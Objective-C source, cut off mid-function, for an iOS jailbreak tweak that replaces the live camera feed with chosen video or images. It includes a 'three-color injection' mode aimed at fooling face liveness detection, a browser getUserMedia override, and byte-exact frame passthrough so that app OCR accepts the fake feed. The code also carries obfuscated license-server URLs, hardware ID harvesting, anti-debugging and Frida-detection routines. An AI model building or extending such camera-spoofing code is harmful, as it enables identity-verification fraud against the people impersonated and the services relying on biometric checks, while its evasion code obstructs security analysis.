// Virtual Camera v7.0 — APP mode + Image/Video replacement
#import <AVFoundation/AVFoundation.h>
#import <CoreImage/CoreImage.h>
#import <Vision/Vision.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <UIKit/UIKit.h>
#import <objc/runtime.h>
#import <objc/message.h>
#import <dlfcn.h>
#include <string.h>
#include <sys/sysctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <mach/mach.h>
#include <mach/mach_time.h>
#include <mach-o/dyld.h>
#include <mach-o/getsect.h>
#include <CommonCrypto/CommonHMAC.h>
#include <CommonCrypto/CommonDigest.h>
#include <CommonCrypto/CommonCryptor.h>
#include <zlib.h>
#import <Security/Security.h>
// IOSurface forward declarations (header not available in Theos SDK)
typedef struct __IOSurface *IOSurfaceRef;
typedef uint32_t IOSurfaceLockOptions;
typedef uint32_t IOSurfaceID;
extern size_t IOSurfaceGetWidth(IOSurfaceRef surface);
extern size_t IOSurfaceGetHeight(IOSurfaceRef surface);
extern uint32_t IOSurfaceGetPixelFormat(IOSurfaceRef surface);
extern size_t IOSurfaceGetAllocSize(IOSurfaceRef surface);
extern size_t IOSurfaceGetBytesPerRow(IOSurfaceRef surface);
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern int IOSurfaceLock(IOSurfaceRef surface, IOSurfaceLockOptions options, uint32_t *seed);
extern IOSurfaceRef IOSurfaceLookup(IOSurfaceID csid);
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef surface);

// ImageIO forward declarations (for CGImageSource, works without UIKit)
typedef struct CGImageSource *CGImageSourceRef;
extern CGImageSourceRef CGImageSourceCreateWithData(CFDataRef data, CFDictionaryRef options);
extern CGImageRef CGImageSourceCreateImageAtIndex(CGImageSourceRef src, size_t index, CFDictionaryRef options);

// Photos framework declarations (loaded dynamically via dlopen)
@interface PHFetchOptions : NSObject
@property (nonatomic, copy) NSArray *sortDescriptors;
@property (nonatomic, assign) NSUInteger fetchLimit;
@end

@interface PHAsset : NSObject
+ (id)fetchAssetsWithMediaType:(NSInteger)mediaType options:(PHFetchOptions *)options;
- (void)requestContentEditingInputWithOptions:(id)options completionHandler:(void (^)(id input, NSDictionary *info))completionHandler;
@end

@interface PHFetchResult : NSObject
@property (nonatomic, readonly) NSUInteger count;
- (id)firstObject;
@end

@interface PHAdjustmentData : NSObject
- (instancetype)initWithFormatIdentifier:(NSString *)formatIdentifier formatVersion:(NSString *)formatVersion data:(NSData *)data;
@end

@interface PHContentEditingInput : NSObject
@property (nonatomic, readonly) NSURL *fullSizeImageURL;
@end

@interface PHContentEditingOutput : NSObject
- (instancetype)initWithContentEditingInput:(id)contentEditingInput;
@property (nonatomic, readonly) NSURL *renderedContentURL;
@property (nonatomic, strong) PHAdjustmentData *adjustmentData;
@end

@interface PHAssetChangeRequest : NSObject
+ (instancetype)changeRequestForAsset:(PHAsset *)asset;
@property (nonatomic, strong) PHContentEditingOutput *contentEditingOutput;
@end

@interface PHPhotoLibrary : NSObject
+ (PHPhotoLibrary *)sharedPhotoLibrary;
- (void)performChanges:(void (^)(void))changeBlock completionHandler:(void (^)(BOOL success, NSError *error))completionHandler;
@end

// WebKit declarations for JS getUserMedia override
@interface WKUserScript : NSObject
- (instancetype)initWithSource:(NSString *)source injectionTime:(NSInteger)injectionTime forMainFrameOnly:(BOOL)forMainFrameOnly;
@end

@interface WKUserContentController : NSObject
- (void)addUserScript:(WKUserScript *)userScript;
@end

// IOSurface function pointers (loaded via dlsym)
static int (*iosurf_Lock)(void *, uint32_t, uint32_t *) = NULL;
static int (*iosurf_Unlock)(void *, uint32_t, uint32_t *) = NULL;
static void *(*iosurf_GetBaseAddress)(void *) = NULL;
static size_t (*iosurf_GetWidth)(void *) = NULL;
static size_t (*iosurf_GetHeight)(void *) = NULL;
static size_t (*iosurf_GetBytesPerRow)(void *) = NULL;
static uint32_t (*iosurf_GetPixelFormat)(void *) = NULL;
static size_t (*iosurf_GetAllocSize)(void *) = NULL;
static BOOL gIOSurfFuncsLoaded = NO;
static volatile uint8_t _hkF1[] = {0x16, 0xB7, 0xD8};

static void vcam_loadIOSurfaceFuncs(void) {
    if (gIOSurfFuncsLoaded) return;
    gIOSurfFuncsLoaded = YES;
    void *h = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    if (!h) return;
    iosurf_Lock = (int (*)(void *, uint32_t, uint32_t *))dlsym(h, "IOSurfaceLock");
    iosurf_Unlock = (int (*)(void *, uint32_t, uint32_t *))dlsym(h, "IOSurfaceUnlock");
    iosurf_GetBaseAddress = (void *(*)(void *))dlsym(h, "IOSurfaceGetBaseAddress");
    iosurf_GetWidth = (size_t (*)(void *))dlsym(h, "IOSurfaceGetWidth");
    iosurf_GetHeight = (size_t (*)(void *))dlsym(h, "IOSurfaceGetHeight");
    iosurf_GetBytesPerRow = (size_t (*)(void *))dlsym(h, "IOSurfaceGetBytesPerRow");
    iosurf_GetPixelFormat = (uint32_t (*)(void *))dlsym(h, "IOSurfaceGetPixelFormat");
    iosurf_GetAllocSize = (size_t (*)(void *))dlsym(h, "IOSurfaceGetAllocSize");
}

#define VCAM_DIR   @"/var/jb/var/mobile/Library/vcamplus"
#define VCAM_VIDEO VCAM_DIR @"/video.mp4"
#define VCAM_IMAGE VCAM_DIR @"/image.jpg"
#define VCAM_FLAG  VCAM_DIR @"/enabled"
#define VCAM_LOG   VCAM_DIR @"/debug.log"
#define VCAM_STREAM VCAM_DIR @"/stream.conf"
#define VCAM_STREAM_FRAME VCAM_DIR @"/stream.jpg"
#define VCAM_TSFILE VCAM_DIR @"/.ts" // last-seen timestamp (anti-rollback)
// Controls are stored in VCAM_FLAG (the enabled file) for cross-process compatibility
static void vcam_showMenu(void);
static UIViewController *vcam_topVC(void);

// --- Anti-tamper: scattered authorization state ---
// NOT a single bool — use volatile + multiple variables that must agree
static const int VCAM_BUILD = 1; // cardkey 版独立 build 号
static volatile int _aS1 = 0;    // auth state fragment 1
static volatile int _aS2 = 0;    // auth state fragment 2 (must equal _aS1 ^ 0x5A)
static volatile int _aS3 = 0;    // auth state fragment 3 (must equal _aS1 ^ 0xC7)
static volatile int _aS4 = 0;    // auth state fragment 4 (must equal ~_aS1 & 0xFFFF)
#define VCAM_AUTH_MAGIC 0x5A
#define VCAM_AUTH_MAGIC2 0xC7
__attribute__((always_inline)) static BOOL _isAuth(void) { return (_aS1 != 0) && (_aS2 == (_aS1 ^ VCAM_AUTH_MAGIC)); }
// Scattered inline auth checks — each uses different fragments so patching _isAuth alone is useless
#define VCAM_CHK_A() ((_aS1 != 0) && (_aS3 == (_aS1 ^ VCAM_AUTH_MAGIC2)))
#define VCAM_CHK_B() ((_aS1 != 0) && (_aS4 == (~_aS1 & 0xFFFF)))
#define VCAM_CHK_C() ((_aS2 ^ VCAM_AUTH_MAGIC) == (_aS3 ^ VCAM_AUTH_MAGIC2))
// Auth-dependent computation key: correct value is always 1.0 when auth is valid
// If cracker sets _aS1 to a fixed value without correct _aS2/_aS3/_aS4, this returns wrong value
// causing video to silently render incorrectly (wrong scale/offset)
__attribute__((always_inline)) static CGFloat _authScale(void) {
    if (_aS1 == 0) return 0.0;
    // Verify: (_aS2 ^ VCAM_AUTH_MAGIC) must equal _aS1
    int v1 = _aS2 ^ VCAM_AUTH_MAGIC;
    // Verify: (_aS3 ^ VCAM_AUTH_MAGIC2) must equal _aS1
    int v2 = _aS3 ^ VCAM_AUTH_MAGIC2;
    // Verify: (~_aS4 & 0xFFFF) must equal _aS1
    int v3 = ~_aS4 & 0xFFFF;
    // If all fragments agree, (v1 - v2) = 0, (v1 - v3) = 0, result = 1.0
    // If any fragment is wrong, result != 1.0 → video renders at wrong scale
    CGFloat drift = (CGFloat)(v1 - v2) + (CGFloat)(v1 - v3);
    return 1.0 / (1.0 + drift * drift);
}

// Auth-dependent XOR derivation for webcam.dat decryption
// Returns the correct extra XOR byte (0x00) only when auth fragments are consistent
__attribute__((always_inline)) __attribute__((unused)) static uint8_t _authXorByte(void) {
    if (_aS1 == 0) return 0xFF;
    // When valid: (_aS2 ^ VCAM_AUTH_MAGIC) == (_aS3 ^ VCAM_AUTH_MAGIC2) == _aS1
    // So ((_aS2 ^ 0x5A) ^ (_aS3 ^ 0xC7)) == 0
    return (uint8_t)((_aS2 ^ VCAM_AUTH_MAGIC) ^ (_aS3 ^ VCAM_AUTH_MAGIC2));
}

// Delayed random degradation counter — doesn't fail immediately
static volatile int _degradeCounter = 0;
static volatile BOOL _degradeActive = NO;

__attribute__((always_inline)) static void _setAuth(BOOL v) {
    if (v) {
        _aS1 = arc4random_uniform(0xFFFF) + 1;
        _aS2 = _aS1 ^ VCAM_AUTH_MAGIC;
        _aS3 = _aS1 ^ VCAM_AUTH_MAGIC2;
        _aS4 = ~_aS1 & 0xFFFF;
        _degradeActive = NO;
        _degradeCounter = 0;
    } else {
        _aS1 = 0; _aS2 = 0; _aS3 = 0; _aS4 = 0;
    }
}

__attribute__((optnone)) static NSString *_ds(const char *enc, int len) {
    char buf[256];
    for (int i = 0; i < len && i < 255; i++) buf[i] = enc[i] ^ 0x37;
    buf[len] = 0;
    return [NSString stringWithUTF8String:buf];
}
// C-string variant for strstr() usage — returns stack-allocated decrypted string
// Caller must use result immediately (not store pointer)
__attribute__((optnone)) static const char *_dsc(const char *enc, int len, char *out) {
    for (int i = 0; i < len; i++) out[i] = enc[i] ^ 0x37;
    out[len] = 0;
    return out;
}
// Multi-key string decryption (key 0x5E) — diversifies XOR patterns to prevent batch decryption
__attribute__((optnone)) static NSString *_ds4(const char *enc, int len) {
    char buf[256];
    for (int i = 0; i < len && i < 255; i++) buf[i] = enc[i] ^ 0x5E;
    buf[len] = 0;
    return [NSString stringWithUTF8String:buf];
}
__attribute__((optnone)) static const char *_dsc4(const char *enc, int len, char *out) {
    for (int i = 0; i < len; i++) out[i] = enc[i] ^ 0x5E;
    out[len] = 0;
    return out;
}
__attribute__((optnone)) static NSString *_ds2(const char *enc, int len) {
    static const uint8_t k2[] = {0xA3, 0x5F, 0xC1, 0x72, 0xE8, 0x14, 0x9D, 0x36};
    char buf[256];
    for (int i = 0; i < len && i < 255; i++) {
        uint8_t b = (uint8_t)enc[i];
        int rot = (i % 5) + 1;
        b = (uint8_t)((b - i * 7) & 0xFF);
        b = (uint8_t)(((b >> rot) | (b << (8 - rot))) & 0xFF);
        b ^= k2[i % 8];
        buf[i] = (char)b;
    }
    buf[len] = 0;
    return [NSString stringWithUTF8String:buf];
}
__attribute__((optnone)) static NSString *_licPath(void) {
    return [VCAM_DIR stringByAppendingPathComponent:_ds("\x5B\x5E\x54\x52\x59\x44\x52\x19\x53\x56\x43", 11)];
}
__attribute__((optnone)) static NSString *_devPath(void) {
    return [VCAM_DIR stringByAppendingPathComponent:_ds("\x53\x52\x41\x5E\x54\x52\x19\x5E\x53", 9)];
}
__attribute__((optnone)) static NSString *_authURL(void) {
    static NSString *u = nil;
    if (!u) u = _ds("\x5f\x43\x43\x47\x44\x0d\x18\x18\x56\x47\x5e\x19\x41\x54\x56\x5a\x47\x5b\x42\x44\x19\x54\x58\x5a\x18\x41\x52\x45\x5e\x51\x4e", 31);
    return u;
}
__attribute__((optnone)) static NSString *_chkURL(void) {
    static NSString *u = nil;
    if (!u) u = _ds("\x5f\x43\x43\x47\x44\x0d\x18\x18\x56\x47\x5e\x19\x41\x54\x56\x5a\x47\x5b\x42\x44\x19\x54\x58\x5a\x18\x54\x5f\x52\x54\x5c", 30);
    return u;
}
__attribute__((optnone)) static NSString *_restoreURL(void) {
    static NSString *u = nil;
    if (!u) u = _ds("\x5f\x43\x43\x47\x44\x0d\x18\x18\x56\x47\x5e\x19\x41\x54\x56\x5a\x47\x5b\x42\x44\x19\x54\x58\x5a\x18\x45\x52\x44\x43\x58\x45\x52", 32);
    return u;
}
__attribute__((optnone)) static NSString *_webJSURL(void) {
    static NSString *u = nil;
    if (!u) u = _ds("\x5f\x43\x43\x47\x44\x0d\x18\x18\x56\x47\x5e\x19\x41\x54\x56\x5a\x47\x5b\x42\x44\x19\x54\x58\x5a\x18\x56\x47\x5e\x18\x40\x52\x55\x5d\x44", 34);
    return u;
}
static NSString *_webJSPath(void) {
    return [VCAM_DIR stringByAppendingPathComponent:@"webcam.dat"];
}

// --- MJPEG stream globals ---
static CIImage *gStreamImage = nil;
static NSLock *gStreamLock = nil;
static BOOL gStreamActive = NO;

// --- Globals ---
static volatile uint8_t _hkF2[] = {0xC7, 0x89, 0x84, 0x7A, 0xF9};
static NSLock *gLockA = nil, *gLockB = nil;
static AVAssetReader *gReaderA = nil, *gReaderB = nil;
static AVAssetReaderTrackOutput *gOutputA = nil, *gOutputB = nil;
// Passthrough reader: outputs source video frames in NV12 (matching camera native format).
// Used by buffer-replacement passthrough path for whitelisted apps so OCR sees byte-exact
// camera-native YUV instead of CIContext-rendered BGRA-converted bytes.
static NSLock *gLockPT = nil;
static AVAssetReader *gReaderPT = nil;
static AVAssetReaderTrackOutput *gOutputPT = nil;
static NSTimeInterval gLastUpTime = 0, gLastDownTime = 0;
static NSTimeInterval gBootTime = 0; // tweak load time, used for boot cooldown
static Class gPreviewLayerClass = nil;
static char kOverlayKey;
static NSMutableSet *gHookedClasses = nil;
static NSMutableSet *gHookIMPs = nil;
static NSMutableArray *gOverlays = nil;
static CIContext *gCICtx = nil;
static CIImage *gStaticImage = nil;
static CGImageRef gStaticCGImage = NULL; // cached CGImage for overlay (bypass CIContext)
static NSMutableSet *gHookedPhotoClasses = nil;
static NSTimeInterval gLastCaptureTime = 0;
static BOOL gCameraSessionActive = NO;
static BOOL gIsVCamEditing = NO;
static size_t gLastPhotoW = 0, gLastPhotoH = 0; // Last captured photo dimensions (for JPEG-format photos)

// --- Video recording (parallel AVAssetWriter) ---
static BOOL gIsRecordingVideo = NO;
static NSURL *gVirtualRecordingURL = nil;
static id gRecWriter = nil;        // AVAssetWriter
static id gRecWriterInput = nil;   // AVAssetWriterInput
static id gRecWriterAdaptor = nil; // AVAssetWriterInputPixelBufferAdaptor
static BOOL gRecSessionStarted = NO;
static dispatch_queue_t gRecQueue = nil;
static dispatch_source_t gRecTimer = nil;
static int gRecFrameCount = 0;
static size_t gRecWidth = 0, gRecHeight = 0;
static NSURL *gRecOriginalURL = nil; // Original recording output URL (DCIM path)

// --- Floating window video controls ---
static int gVideoIndex = 0;          // Current video index (0=video.mp4, 1-6=1.mp4~6.mp4)
static int gVideoRotation = 0;       // Rotation angle (0/90/180/270)
static BOOL gVideoFlipH = NO;        // Horizontal flip
static BOOL gVideoPaused = NO;       // Pause state
static CIImage *gPausedFrame = nil;  // Cached frame when paused
static CGFloat gVideoOffsetX = 0;    // Horizontal offset (ratio, ±0.05 step)
static CGFloat gVideoOffsetY = 0;    // Vertical offset (ratio, ±0.05 step)

// --- Three-color injection (活体检测三色注入) ---
static BOOL gColorInject = NO;          // Color injection enabled
static CGFloat gInjectR = 0, gInjectG = 0, gInjectB = 0; // Sampled screen color (0~1)
static CGFloat gInjectAlpha = 0.35;     // Overlay intensity (default 35%)
static CGFloat gInjectDiameter = 0.50;  // Face overlay diameter multiplier (0.1~1.0)
static CGFloat gInjectOffX = 0.0;       // Face overlay X offset (-0.5~0.5)
static CGFloat gInjectOffY = 0.0;       // Face overlay Y offset (-0.5~0.5)
static int gInjectMode = 0;             // 0=ellipse (模式1), 1=rectangle (模式2)

static NSData *_logXor(NSData *input) {
    static const uint8_t k[] = {0x56,0x43,0x4D,0x2B,0x6C,0x30,0x67,0x5F,0x6B,0x33,0x79,0x21};
    NSMutableData *out = [NSMutableData dataWithLength:input.length];
    const uint8_t *src = (const uint8_t *)input.bytes;
    uint8_t *dst = (uint8_t *)out.mutableBytes;
    for (NSUInteger i = 0; i < input.length; i++) dst[i] = src[i] ^ k[i % sizeof(k)];
    return out;
}

static void vcam_log(NSString *msg) {
    @try {
        NSString *ts = [NSDateFormatter localizedStringFromDate:[NSDate date]
                        dateStyle:NSDateFormatterNoStyle timeStyle:NSDateFormatterMediumStyle];
        NSString *proc = [[NSProcessInfo processInfo] processName];
        NSString *line = [NSString stringWithFormat:@"[%@] %@: %@\n", ts, proc, msg];
        NSData *raw = [line dataUsingEncoding:NSUTF8StringEncoding];
        NSData *enc = _logXor(raw);
        NSString *b64 = [enc base64EncodedStringWithOptions:0];
        NSString *encLine = [b64 stringByAppendingString:@"\n"];
        NSFileManager *fm = [NSFileManager defaultManager];
        if (![fm fileExistsAtPath:VCAM_LOG]) [fm createFileAtPath:VCAM_LOG contents:nil attributes:nil];
        NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:VCAM_LOG];
        [fh seekToEndOfFile]; [fh writeData:[encLine dataUsingEncoding:NSUTF8StringEncoding]]; [fh closeFile];
    } @catch (NSException *e) {}
}

// --- Authorization system (hardened) ---

// Device ID (works in all processes)
// Get real hardware UDID via IORegistry (kernel-level, bypass MGCopyAnswer hooks)
// Use dlsym to avoid IOKit header issues on Theos
typedef mach_port_t io_object_t;
typedef io_object_t io_registry_entry_t;
static NSString *_getIORegUDID(void) {
    NSString *uid = nil;
    @try {
        void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
        if (!iokit) return nil;
        typedef io_registry_entry_t (*IORegFromPath_t)(mach_port_t, const char *);
        typedef CFTypeRef (*IORegCreateProp_t)(io_registry_entry_t, CFStringRef, CFAllocatorRef, uint32_t);
        typedef kern_return_t (*IOObjRelease_t)(io_object_t);
        IORegFromPath_t IORegistryEntryFromPath = (IORegFromPath_t)dlsym(iokit, "IORegistryEntryFromPath");
        IORegCreateProp_t IORegistryEntryCreateCFProperty = (IORegCreateProp_t)dlsym(iokit, "IORegistryEntryCreateCFProperty");
        IOObjRelease_t IOObjectRelease = (IOObjRelease_t)dlsym(iokit, "IOObjectRelease");
        if (!IORegistryEntryFromPath || !IORegistryEntryCreateCFProperty || !IOObjectRelease) return nil;
        io_registry_entry_t entry = IORegistryEntryFromPath(0, "IODeviceTree:/chosen");
        if (entry) {
            CFDataRef data = (CFDataRef)IORegistryEntryCreateCFProperty(entry, CFSTR("unique-chip-id"), kCFAllocatorDefault, 0);
            if (data) {
                if (CFDataGetLength(data) >= 8) {
                    const uint8_t *bytes = CFDataGetBytePtr(data);
                    uint64_t ecid = 0;
                    for (int i = 7; i >= 0; i--) ecid = (ecid << 8) | bytes[i];
                    uid = [NSString stringWithFormat:@"ECID-%llX", ecid];
                }
                CFRelease(data);
            }
            IOObjectRelease(entry);
        }
    } @catch (NSException *e) {}
    return uid;
}

// Get real hardware UDID via MGCopyAnswer (fallback)
static NSString *_getMGUDID(void) {
    NSString *uid = nil;
    @try {
        void *mg = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_LAZY);
        if (mg) {
            typedef CFStringRef (*MGFunc)(CFStringRef);
            MGFunc f = (MGFunc)dlsym(mg, "MGCopyAnswer");
            if (f) {
                CFStringRef val = f((__bridge CFStringRef)_ds("\x62\x59\x5E\x46\x42\x52\x73\x52\x41\x5E\x54\x52\x7E\x73",14));
                if (val) { uid = (__bridge_transfer NSString *)val; }
            }
        }
    } @catch (NSException *e) {}
    return uid;
}

// Get real hardware UDID: IORegistry first, then MGCopyAnswer, then identifierForVendor


// ECID cache path
static NSString *_ecidPath(void) {
    return [VCAM_DIR stringByAppendingPathComponent:@"ecid.dat"];
}

static NSString *_gDID(void) {
    // 1. Always read cached file first — single source of truth across ALL processes
    NSString *cached = [NSString stringWithContentsOfFile:_devPath()
        encoding:NSUTF8StringEncoding error:nil];
    if (cached && cached.length > 0) {
        // Tamper check: in SpringBoard, verify UDID + ECID both match hardware
        NSString *proc = [[NSProcessInfo processInfo] processName];
        if ([proc isEqualToString:_ds("\x64\x47\x45\x5E\x59\x50\x75\x58\x56\x45\x53",11)]) {
            BOOL tampered = NO;
            // Check 1: UDID — MGCopyAnswer vs file
            NSString *realUDID = _getMGUDID();
            if (realUDID && realUDID.length > 0 && ![cached isEqualToString:realUDID]) {
                vcam_log(@"DID: UDID tamper detected!");
                tampered = YES;
            }
            // Check 2: ECID — IORegistry vs cached ecid.dat
            NSString *realECID = _getIORegUDID();
            if (realECID && realECID.length > 0) {
                NSString *cachedECID = [NSString stringWithContentsOfFile:_ecidPath()
                    encoding:NSUTF8StringEncoding error:nil];
                if (cachedECID && cachedECID.length > 0 && ![cachedECID isEqualToString:realECID]) {
                    vcam_log(@"DID: ECID tamper detected!");
                    tampered = YES;
                }
                // Always save real ECID
                [realECID writeToFile:_ecidPath() atomically:YES encoding:NSUTF8StringEncoding error:nil];
            }
            if (tampered) {
                _setAuth(NO);
                [[NSFileManager defaultManager] removeItemAtPath:_licPath() error:nil];
                [[NSFileManager defaultManager] removeItemAtPath:_webJSPath() error:nil];
                // Restore real UDID to file
                if (realUDID && realUDID.length > 0) {
                    [realUDID writeToFile:_devPath() atomically:YES encoding:NSUTF8StringEncoding error:nil];
                    return realUDID;
                }
            }
        }
        return cached;
    }
    // 2. Only SpringBoard generates device.id (non-sandboxed)
    NSString *proc = [[NSProcessInfo processInfo] processName];
    if (![proc isEqualToString:_ds("\x64\x47\x45\x5E\x59\x50\x75\x58\x56\x45\x53",11)]) return @"unknown";
    // 3. Get UDID via MGCopyAnswer
    NSString *uid = _getMGUDID();
    if (!uid || uid.length == 0) {
        @try {
            if ([UIDevice class])
                uid = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
        } @catch (NSException *e) {}
    }
    // 4. Save UDID + ECID
    if (uid && uid.length > 0) {
        [uid writeToFile:_devPath() atomically:YES encoding:NSUTF8StringEncoding error:nil];
        NSString *ecid = _getIORegUDID();
        if (ecid && ecid.length > 0) {
            [ecid writeToFile:_ecidPath() atomically:YES encoding:NSUTF8StringEncoding error:nil];
        }
        return uid;
    }
    return @"unknown";
}


static void _sDID(void) {
    if ([[NSFileManager defaultManager] fileExistsAtPath:_devPath()]) return;
    _gDID();
}

__attribute__((optnone)) static void _xorBuf(uint8_t *buf, NSUInteger len) {
    volatile uint8_t k[8] = {0x56^0x12, 0x43^0x34, 0x41^0x56, 0x4D^0x78, 0x2B^0x9A, 0x1F^0xBC, 0x7E^0xDE, 0x3A^0xF0};
    for (NSUInteger i = 0; i < len; i++) buf[i] ^= k[i % 8];
}

// Anti-rollback: save current timestamp
static void _savTS(void) {
    @try {
        double now = [[NSDate date] timeIntervalSince1970];
        NSString *s = [NSString stringWithFormat:@"%.0f", now];
        [s writeToFile:VCAM_TSFILE atomically:YES encoding:NSUTF8StringEncoding error:nil];
    } @catch (NSException *e) {}
}
// Anti-rollback: check if system time was rolled back
// Returns YES if time appears normal, NO if rollback detected
__attribute__((unused)) static BOOL _chkTS(void) {
    @try {
        NSString *s = [NSString stringWithContentsOfFile:VCAM_TSFILE encoding:NSUTF8StringEncoding error:nil];
        if (!s) return YES; // no saved timestamp yet, allow
        double saved = [s doubleValue];
        if (saved < 1000000000) return YES; // invalid value, allow
        double now = [[NSDate date] timeIntervalSince1970];
        // If current time is more than 10 minutes BEFORE saved time, rollback detected
        if (now < saved - 600) return NO;
        return YES;
    } @catch (NSException *e) { return YES; }
}

// Read local cache
// Build-time hash of __DATE__ __TIME__ — different per build, makes bindiff
// of dead-branch bytes vs commercial (or vs prior friend builds) noisy.
__attribute__((always_inline)) static inline uint32_t _bdHash(void) {
    volatile uint32_t h = 0xDEADBEEFu;
    const char *p = __DATE__ __TIME__;
    while (*p) { h = (h * 31u) ^ (uint32_t)(unsigned char)*p; p++; }
    return h;
}

static BOOL _chkLC(void) {
    // [CARDKEY] 离线卡密版：读取本地加密缓存，校验 UDID 绑定 + 过期时间 + 完整性校验和
    @try {
        volatile int _s = 0;
        BOOL _r = NO;
        NSData *data = nil; NSString *b64 = nil; NSData *dec = nil;
        NSMutableData *md = nil; NSDictionary *d = nil;
        NSString *u = nil; NSNumber *e = nil, *c = nil;
        long long eVal = 0, cVal = 0;
        while (1) switch (_s) {
            case 0: _s = _chkTS() ? 3 : 7; break;
            case 3: data = [NSData dataWithContentsOfFile:_licPath()];
                    _s = (data && data.length >= 10) ? 5 : 7; break;
            case 5: b64 = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
                    _s = b64 ? 8 : 7; break;
            case 7: _r = NO; _s = 99; break;
            case 8: dec = [[NSData alloc] initWithBase64EncodedString:b64 options:0];
                    _s = dec ? 11 : 7; break;
            case 11: md = [NSMutableData dataWithData:dec];
                     _xorBuf((uint8_t *)[md mutableBytes], md.length);
                     d = [NSJSONSerialization JSONObjectWithData:md options:0 error:nil];
                     _s = d ? 14 : 7; break;
            case 14: u = d[@"u"]; e = d[@"e"]; c = d[@"c"];
                     _s = (u && e && c) ? 17 : 7; break;
            case 17: eVal = [e longLongValue]; cVal = [c longLongValue];
                     _s = (cVal == (eVal % 99991)) ? 20 : 7; break;
            case 20: _s = [u isEqualToString:_gDID()] ? 23 : 7; break;
            case 23: { double nowMs = [[NSDate date] timeIntervalSince1970] * 1000.0;
                     _s = (nowMs <= (double)eVal) ? 26 : 7; } break;
            case 26: _r = YES; _s = 99; break;
            case 31: if (_aS2 > 0x7FFF) { _s = 42; } else { _s = 7; } break; // dead
            case 42: _r = (_aS4 != 0); _s = 7; break; // dead
            case 55: if (data) { _s = 31; } else { _s = 42; } break; // dead
            case 99: return _r;
            default: return NO;
        }
    } @catch (NSException *e) { return NO; }
}

// Read cached key string
__attribute__((optnone)) static NSString *_getCachedKey(void) {
    @try {
        NSData *data = [NSData dataWithContentsOfFile:_licPath()];
        if (!data || data.length < 10) return nil;
        NSString *b64 = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
        if (!b64) return nil;
        NSData *dec = [[NSData alloc] initWithBase64EncodedString:b64 options:0];
        if (!dec) return nil;
        NSMutableData *md = [NSMutableData dataWithData:dec];
        _xorBuf((uint8_t *)[md mutableBytes], md.length);
        NSDictionary *d = [NSJSONSerialization JSONObjectWithData:md options:0 error:nil];
        if (!d) return nil;
        return d[@"k"];
    } @catch (NSException *e) { return nil; }
}

// Save to cache
static void _svLC(NSString *key, NSString *udid, double expires, int usesLeft) {
    @try {
        double realExp = expires; // real server expiry for display
        double maxExp = [[NSDate date] timeIntervalSince1970] * 1000.0 + 25.0 * 3600000.0; /* 25h buffer for 1-day cards */
        if (expires > maxExp) expires = maxExp;
        long long eVal = (long long)expires;
        long long chk = eVal % 99991; // integrity checksum
        NSDictionary *d = @{@"k": key, @"u": udid, @"e": @(eVal), @"c": @(chk), @"re": @((long long)realExp), @"ul": @(usesLeft)};
        NSData *json = [NSJSONSerialization dataWithJSONObject:d options:0 error:nil];
        if (!json) return;
        NSMutableData *md = [NSMutableData dataWithData:json];
        _xorBuf((uint8_t *)[md mutableBytes], md.length);
        NSString *b64 = [md base64EncodedStringWithOptions:0];
        [b64 writeToFile:_licPath() atomically:YES encoding:NSUTF8StringEncoding error:nil];
    } @catch (NSException *e) {}
}

// --- Hardening 3: Anti-Debug ---
#define PT_DENY_ATTACH 31

__attribute__((optnone)) static void _adPtrace(void) {
    // Devmode: skip PT_DENY_ATTACH so author can attach lldb/Frida to host process
    NSString *p = [VCAM_DIR stringByAppendingPathComponent:@".devmode"];
    if ([[NSFileManager defaultManager] fileExistsAtPath:p]) return;
    typedef int (*ptrace_t)(int, pid_t, caddr_t, int);
    void *h = dlopen(NULL, RTLD_LAZY);
    if (!h) return;
    volatile char s[] = {'p','t','r','a','c','e',0};
    ptrace_t pt = (ptrace_t)dlsym(h, (const char *)s);
    if (pt) pt(PT_DENY_ATTACH, 0, 0, 0);
}

__attribute__((always_inline)) static BOOL _adSysctl(void) {
    struct kinfo_proc info;
    memset(&info, 0, sizeof(info));
    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, getpid()};
    size_t sz = sizeof(info);
    if (sysctl(mib, 4, &info, &sz, NULL, 0) == 0) {
        return (info.kp_proc.p_flag & P_TRACED) != 0;
    }
    return NO;
}

__attribute__((always_inline)) static BOOL _adParent(void) {
    pid_t ppid = getppid();
    if (ppid <= 1) return NO;
    struct kinfo_proc info;
    memset(&info, 0, sizeof(info));
    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_PID, ppid};
    size_t sz = sizeof(info);
    if (sysctl(mib, 4, &info, &sz, NULL, 0) == 0) {
        NSString *pname = [NSString stringWithUTF8String:info.kp_proc.p_comm];
        NSString *lower = [pname lowercaseString];
        if ([lower containsString:_ds4("\x3A\x3B\x3C\x2B\x37",5)] ||
            [lower containsString:_ds4("\x32\x32\x3A\x3C",4)] ||
            [lower containsString:_ds4("\x38\x2C\x37\x3A\x3F",5)] ||
            [lower containsString:_ds4("\x39\x3A\x3C",3)] ||
            [lower containsString:_ds4("\x3D\x27\x3D\x2C\x37\x2E\x2A",7)]) {
            return YES;
        }
    }
    return NO;
}

// --- Hardening 3b: Frida / Cycript / injection detection ---
__attribute__((optnone)) static BOOL _chkFrida(void) {
    volatile int _s = 0;
    BOOL _r = NO;
    uint32_t _i = 0, _cnt = 0;
    while (1) switch (_s) {
        case 0: _cnt = _dyld_image_count(); _i = 0; _s = 2; break;
        case 2: _s = (_i < _cnt) ? 4 : 10; break;
        case 4: {
            const char *name = _dyld_get_image_name(_i);
            if (name) {
                char _b1[40],_b2[40],_b3[40],_b4[40],_b5[40],_b6[40],_b7[40],_b8[40],_b9[40];
                if (strstr(name, _dsc4("\x18\x2C\x37\x3A\x3F\x19\x3F\x3A\x39\x3B\x2A",11,_b1)) ||
                    strstr(name, _dsc4("\x38\x2C\x37\x3A\x3F\x33\x3F\x39\x3B\x30\x2A",11,_b2)) ||
